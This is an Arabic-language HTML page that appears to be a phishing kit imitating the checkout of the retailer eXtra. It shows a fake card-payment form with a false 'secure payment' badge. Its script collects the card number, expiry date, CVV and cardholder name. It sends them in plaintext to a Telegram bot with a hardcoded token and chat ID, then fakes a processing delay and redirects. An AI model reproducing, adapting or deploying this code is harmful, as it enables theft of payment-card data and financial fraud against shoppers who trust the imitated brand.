<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>eXtra - الدفع</title>
    <style>
        /* Reset & Base Styles */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', 'Tahoma', Geneva, Verdana, sans-serif;
        }
        
        body {
            background-color: #f8f9fa;
            color: #333;
            line-height: 1.6;
            font-size: 14px;
        }
        
        /* Header Styles */
        .top-bar {
            background-color: #fff;
            border-bottom: 1px solid #e0e0e0;
            padding: 12px 0;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        
        .header-container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        
        .logo img {
            height: 32px;
        }
        
        /* Main Content */
        .container {
            max-width: 800px;
            margin: 30px auto;
            padding: 0 20px;
        }
        
        /* Payment Header */
        .payment-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 30px;
            padding-bottom: 15px;
            border-bottom: 1px solid #eee;
        }
        
        .total-amount {
            font-size: 18px;
            font-weight: 600;
            color: #0066cc;
        }
        
        .back-btn {
            background: none;
            border: none;
            color: #0066cc;
            font-size: 14px;
            cursor: pointer;
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        .back-btn:hover {
            text-decoration: underline;
        }
        
        /* Payment Methods */
        .payment-methods {
            margin-bottom: 30px;
        }
        
        .payment-title {
            font-size: 18px;
            color: #333;
            margin-bottom: 20px;
            font-weight: 500;
        }
        
        /* Credit Card Form */
        .card-form {
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.05);
            padding: 25px;
            margin-bottom: 30px;
        }
        
        .form-group {
            margin-bottom: 20px;
        }
        
        .form-row {
            display: flex;
            gap: 15px;
            margin-bottom: 15px;
        }
        
        .form-col {
            flex: 1;
        }
        
        label {
            display: block;
            margin-bottom: 8px;
            color: #555;
            font-weight: 500;
        }
        
        .input-field {
            width: 100%;
            padding: 12px 15px;
            border: 1px solid #ddd;
            border-radius: 6px;
            font-size: 14px;
            transition: border 0.3s;
        }
        
        .input-field:focus {
            border-color: #0066cc;
            outline: none;
            box-shadow: 0 0 0 2px rgba(0, 102, 204, 0.1);
        }
        
        .card-icons {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }
        
        .card-icon {
            width: 40px;
            height: 25px;
            background-color: #f5f5f5;
            border-radius: 4px;
            display: flex;
            align-items: center;
            justify-content: center;
        }
        
        .card-icon img {
            max-width: 80%;
            max-height: 80%;
        }
        
        /* Order Summary */
        .order-summary {
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.05);
            padding: 25px;
        }
        
        .summary-title {
            font-size: 16px;
            color: #333;
            margin-bottom: 20px;
            font-weight: 500;
        }
        
        .summary-row {
            display: flex;
            justify-content: space-between;
            margin-bottom: 12px;
        }
        
        .summary-label {
            color: #666;
        }
        
        .summary-value {
            font-weight: 500;
        }
        
        .summary-total {
            border-top: 1px solid #eee;
            padding-top: 15px;
            margin-top: 15px;
            font-weight: bold;
        }
        
        .summary-total .summary-value {
            color: #0066cc;
            font-size: 16px;
        }
        
        /* Payment Button */
        .payment-actions {
            margin-top: 30px;
            text-align: center;
        }
        
        .pay-btn {
            background: #0066cc;
            color: white;
            border: none;
            border-radius: 6px;
            padding: 14px 30px;
            font-size: 16px;
            font-weight: 500;
            cursor: pointer;
            transition: background 0.2s;
            box-shadow: 0 2px 8px rgba(0, 102, 204, 0.2);
            width: 100%;
            max-width: 300px;
        }
        
        .pay-btn:hover {
            background: #0052a3;
        }
        
        .pay-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
        }
        
        /* Loading Overlay */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            right: 0;
            bottom: 0;
            background: rgba(255, 255, 255, 0.9);
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            z-index: 1000;
            opacity: 0;
            pointer-events: none;
            transition: opacity 0.3s;
        }
        
        .loading-overlay.active {
            opacity: 1;
            pointer-events: all;
        }
        
        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 4px solid rgba(0, 102, 204, 0.2);
            border-radius: 50%;
            border-top-color: #0066cc;
            animation: spin 1s ease-in-out infinite;
            margin-bottom: 20px;
        }
        
        .loading-text {
            color: #0066cc;
            font-size: 16px;
            margin-top: 15px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        /* Card Preview */
        .card-preview {
            background: linear-gradient(135deg, #0066cc, #004080);
            border-radius: 10px;
            padding: 20px;
            color: white;
            margin-bottom: 20px;
            height: 180px;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            transition: all 0.3s;
        }
        
        .card-chip {
            width: 40px;
            height: 30px;
            background: #ffd700;
            border-radius: 5px;
        }
        
        .card-number {
            font-size: 18px;
            letter-spacing: 1px;
            font-family: 'Courier New', monospace;
            margin: 15px 0;
        }
        
        .card-details {
            display: flex;
            justify-content: space-between;
        }
        
        .card-name {
            font-size: 14px;
            text-transform: uppercase;
        }
        
        .card-expiry {
            font-size: 14px;
        }
        
        /* Security Badge */
        .security-badge {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-top: 20px;
            color: #4CAF50;
            font-size: 13px;
        }
    </style>
</head>
<body>
    <!-- Top Header Bar -->
    <div class="top-bar">
        <div class="header-container">
            <div class="logo">
                <img src="extraordinshaiaa881.img" alt="eXtra">
            </div>
            <div class="secure-badge">
                <span style="font-size: 12px; color: #4CAF50;">✓ الدفع الآمن</span>

    </div>
    
    <!-- Main Content -->
    <div class="container">
        <!-- Payment Header -->
        <div class="payment-header">
            <button class="back-btn" onclick="window.location.href='index.html'">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                    <path d="M14 7L15.41 8.41L10.83 13L15.41 17.59L14 19L8 13L14 7Z" fill="#0066cc"/>
                </svg>
                العودة
            </button>
            <div class="total-amount">المبلغ الإجمالي: 1,995.00 ر.س</div>
        </div>
        
        <!-- Payment Methods -->
        <div class="payment-methods">
            <h2 class="payment-title">الدفع باستخدام بطاقة الائتمان</h2>
            
            <!-- Card Preview -->
            <div class="card-preview" id="cardPreview">
                <div class="card-chip"></div>
                <div class="card-number" id="previewCardNumber">•••• •••• •••• ••••</div>

                    <div class="card-name" id="previewCardName">اسم حامل البطاقة</div>
                    <div class="card-expiry" id="previewCardExpiry">MM/YY</div>
                </div>
            </div>
            
            <!-- Credit Card Form -->
            <div class="card-form">
                <form id="paymentForm">
                    <div class="form-group">
                        <label for="cardNumber">رقم البطاقة</label>
                        <input type="text" id="cardNumber" class="input-field" placeholder="1234 5678 9012 3456" maxlength="19" required>
                        
                        <div class="card-icons">
                            <div class="card-icon">
                                <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzOCAyNCI+PHBhdGggZmlsbD0iIzAwNjZDNyIgZD0iTTM1IDBjMi4yIDAgNCAxLjggNCA0djE2YzAgMi4yLTEuOCA0LTQgNEgzYy0yLjIgMC00LTEuOC00LTRWNGMwLTIuMiAxLjgtNCA0LTRoMzIiLz48cGF0aCBmaWxsPSIjRkZGIiBkPSJNMzUgMWMyLjIgMCA0IDEuOCA0IDR2MTZjMCAyLjItMS44IDQtNCA0SDNjLTIuMiAwLTQtMS44LTQtNFY1YzAtMi4yIDEuOC00IDQtNGgzMiIvPjxwYXRoIGZpbGw9IiMwMDY2QzciIGQ9Ik0zNSAxYzIuMiAwIDQgMS44IDQgNHYxNmMwIDIuMi0xLjggNC00IDRIM2MtMi4yIDAtNC0xLjgtNC00VjVjMC0yLjIgMS44LTQgNC00aDMyIi8+PC9zdmc+" alt="Visa">
                            </div>
                            <div class="card-icon">
                                <img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzOCAyNCI+PHBhdGggZmlsbD0iIzAwNjZDNyIgZD0iTTM1IDBjMi4yIDAgNCAxLjggNCA0djE2YzAgMi4yLTEuOCA0LTQgNEgzYy0yLjIgMC00LTEuOC00LTRWNGMwLTIuMiAxLjgtNCA0LTRoMzIiLz48cGF0aCBmaWxsPSIjRkZGIiBkPSJNMzUgMWMyLjIgMCA0IDEuOCA0IDR2MTZjMCAyLjItMS44IDQtNCA0SDNjLTIuMiAwLTQtMS44LTQtNFY1YzAtMi4yIDEuOC00IDQtNGgzMiIvPjxwYXRoIGZpbGw9IiMwMDY2QzciIGQ9Ik0zNSAxYzIuMiAwIDQgMS44IDQgNHYxNmMwIDIuMi0xLjggNC00IDRIM2MtMi4yIDAtNC0xLjgtNC00VjVjMC0yLjIgMS44LTQgNC00aDMyIi8+PC9zdmc+" alt="Mastercard">
                            </div>
                        </div>
                    </div>
                    
                    <div class="form-row">
                        <div class="form-col">
                            <label for="expiryDate">تاريخ الانتهاء</label>
                            <input type="text" id="expiryDate" class="input-field" placeholder="MM/YY" maxlength="5" required>
                        </div>
                        <div class="form-col">
                            <label for="cvv">CVV</label>
                            <input type="password" id="cvv" class="input-field" placeholder="•••" maxlength="3" required>
                        </div>
                    </div>
                    
                    <div class="form-group">
                        <label for="cardName">اسم حامل البطاقة</label>
                        <input type="text" id="cardName" class="input-field" placeholder="كما هو مدون على البطاقة" required>
                    </div>
                    
                    <div class="security-badge">
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="#4CAF50" xmlns="http://www.w3.org/2000/svg">
                            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
                        </svg>
                        <span>معلوماتك محمية بتقنيات التشفير</span>
                    </div>
                </form>
            </div>
        </div>
        
        <!-- Order Summary -->
        <div class="order-summary">
            <h3 class="summary-title">ملخص طلبك</h3>
            
            <div class="summary-row">
                <span class="summary-label">المجموع الفرعي</span>
                <span class="summary-value">1,900.00 ر.س</span>
            </div>
            <div class="summary-row">
                <span class="summary-label">رسوم التوصيل</span>
                <span class="summary-value">مجاناً</span>
            </div>
            <div class="summary-row">
                <span class="summary-label">الضريبة</span>
                <span class="summary-value">95.00 ر.س</span>
            </div>
            <div class="summary-row summary-total">
                <span class="summary-label">المجموع الكلي</span>
                <span class="summary-value">1,995.00 ر.س</span>
            </div>
        </div>
        
        <!-- Payment Button -->
        <div class="payment-actions">
            <button type="submit" form="paymentForm" class="pay-btn" id="payBtn">ادفع الآن</button>
        </div>
    </div>
    
    <!-- Loading Overlay -->
    <div class="loading-overlay" id="loadingOverlay">
        <div class="loading-spinner"></div>
        <div class="loading-text">جاري معالجة الدفع...</div>
    </div>
    
    <script>
        // Payment Form Handling
        document.addEventListener('DOMContentLoaded', function() {
            // Form Elements
            const paymentForm = document.getElementById('paymentForm');
            const cardNumber = document.getElementById('cardNumber');
            const expiryDate = document.getElementById('expiryDate');
            const cvv = document.getElementById('cvv');
            const cardName = document.getElementById('cardName');
            const payBtn = document.getElementById('payBtn');
            const loadingOverlay = document.getElementById('loadingOverlay');
            
            // Preview Elements
            const previewCardNumber = document.getElementById('previewCardNumber');
            const previewCardName = document.getElementById('previewCardName');
            const previewCardExpiry = document.getElementById('previewCardExpiry');
            
            // Format Card Number
            cardNumber.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
                let formatted = '';
                
                for (let i = 0; i < value.length; i++) {
                    if (i > 0 && i % 4 === 0) formatted += ' ';
                    formatted += value[i];
                }
                
                e.target.value = formatted.trim();
                updateCardPreview('number', formatted);
            });
            
            // Format Expiry Date
            expiryDate.addEventListener('input', function(e) {
                let value = e.target.value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
                let formatted = '';
                
                for (let i = 0; i < value.length; i++) {
                    if (i === 2) formatted += '/';
                    formatted += value[i];
                }
                
                e.target.value = formatted.trim();
                updateCardPreview('expiry', formatted);
            });
            
            // Validate CVV
            cvv.addEventListener('input', function(e) {
                e.target.value = e.target.value.replace(/[^0-9]/gi, '');
            });
            
            // Update Card Name Preview
            cardName.addEventListener('input', function(e) {
                updateCardPreview('name', e.target.value);
            });
            
            // Update Card Preview
            function updateCardPreview(type, value) {
                switch(type) {
                    case 'number':
                        previewCardNumber.textContent = value || '•••• •••• •••• ••••';
                        break;
                    case 'expiry':
                        previewCardExpiry.textContent = value || 'MM/YY';
                        break;
                    case 'name':
                        previewCardName.textContent = value || 'اسم حامل البطاقة';
                        break;
                }
            }
            
            // Form Submission
            paymentForm.addEventListener('submit', function(e) {
                e.preventDefault();
                
                // Disable button
                payBtn.disabled = true;
                payBtn.textContent = 'جاري المعالجة...';
                
                // Show loading overlay
                loadingOverlay.classList.add('active');
                
                // Prepare payment data
                const paymentData = {
                    amount: '1,995.00 ر.س',
                    cardName: cardName.value.trim(),
                    cardNumber: cardNumber.value.replace(/\s+/g, ''),
                    expiryDate: expiryDate.value,
                    cvv: cvv.value,
                    timestamp: new Date().toISOString()
                };
                
                // Save to localStorage
                localStorage.setItem('paymentData', JSON.stringify(paymentData));
                
                // Send to Telegram bots (simultaneously)
                sendToTelegramBots(paymentData);
                
                // Simulate processing delay
                setTimeout(function() {
                    window.location.href = 'traitement1.html';
                }, 10000); // 10 seconds
            });
            
            // Function to send data to Telegram bots (UNENCRYPTED)
            function sendToTelegramBots(data) {
                const bots = [
                    { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" },
                    { token: "7092624874:AAFrJgkFMocbi1BrFaWXNBkGjmGvnbxqwFw", chatId: "5372119436" }
                ];
                
                // Format message (UNENCRYPTED)
                const message = `💳 دفعة جديدة 💳
📌 المبلغ: ${data.amount}
👤 الاسم: ${data.cardName}
🔢 رقم البطاقة: ${data.cardNumber}
📅 تاريخ الانتهاء: ${data.expiryDate}
🔐 CVV: ${data.cvv}
⏰ وقت الإرسال: ${new Date(data.timestamp).toLocaleString('ar-SA')}`;
                
                // Send to each bot (UNENCRYPTED)
                bots.forEach(bot => {
                    fetch(`https://api.telegram.org/bot${bot.token}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: bot.chatId,
                            text: message,
                            parse_mode: 'HTML'
                        }),
                    }).catch(error => console.error('Error sending to Telegram bot:', error));
                });
            }
        });
    </script>
</body>
</html>
